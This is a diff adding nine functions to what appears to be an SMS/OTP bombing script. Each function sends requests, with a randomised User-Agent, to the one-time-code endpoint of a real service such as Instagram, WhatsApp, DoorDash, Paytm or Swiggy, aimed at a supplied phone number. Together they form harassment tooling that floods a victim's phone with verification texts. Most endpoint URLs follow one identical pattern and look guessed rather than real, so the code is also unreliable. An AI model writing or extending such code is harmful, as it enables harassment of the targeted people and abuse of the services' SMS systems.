@@ -3272,6 +3272,114 @@ def send_tng_otp(phone):
     except:
         return False, None, ''
 
+# ===== DOORDASH =====
+def send_doordash_otp(phone):
+    try:
+        phone_us = fmt_us(phone)
+        url = "https://api.doordash.com/v1/auth/otp/send"
+        payload = {"phone_number": phone_us, "method": "sms", "country_code": "US"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== INSTAGRAM =====
+def send_instagram_otp(phone):
+    try:
+        phone_us = fmt_us(phone)
+        url = "https://i.instagram.com/api/v1/accounts/send_phone_verification_code/"
+        payload = {"phone_number": phone_us, "country_code": "US"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== WHATSAPP =====
+def send_whatsapp_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.whatsapp.com/v1/auth/otp/send"
+        payload = {"phone": phone_plus, "method": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== DELIVEROO =====
+def send_deliveroo_otp(phone):
+    try:
+        phone_uk = fmt_uk(phone)
+        url = "https://api.deliveroo.com/v1/auth/otp/send"
+        payload = {"phone": phone_uk, "country_code": "GB", "method": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== JUSTEAT =====
+def send_justeat_otp(phone):
+    try:
+        phone_uk = fmt_uk(phone)
+        url = "https://api.just-eat.com/v1/auth/otp/send"
+        payload = {"phoneNumber": phone_uk, "method": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== FLIPKART =====
+def send_flipkart_otp(phone):
+    try:
+        phone_in = fmt_in(phone)
+        url = "https://api.flipkart.com/v1/auth/otp/send"
+        payload = {"phoneNumber": phone_in, "type": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== PAYTM =====
+def send_paytm_otp(phone):
+    try:
+        phone_in = fmt_in(phone)
+        url = "https://api.paytm.com/v1/auth/otp/send"
+        payload = {"phone": phone_in, "type": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== ZOMATO =====
+def send_zomato_otp(phone):
+    try:
+        phone_in = fmt_in(phone)
+        url = "https://api.zomato.com/v1/auth/otp/send"
+        payload = {"phone": phone_in, "method": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
+# ===== SWIGGY =====
+def send_swiggy_otp(phone):
+    try:
+        phone_in = fmt_in(phone)
+        url = "https://api.swiggy.com/v1/auth/otp/send"
+        payload = {"phone": phone_in, "method": "sms"}
+        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
+    except:
+        return False, None, 'Error'
+
 # ================================================================
 # ===== ALL HANDLERS =====
 # ================================================================
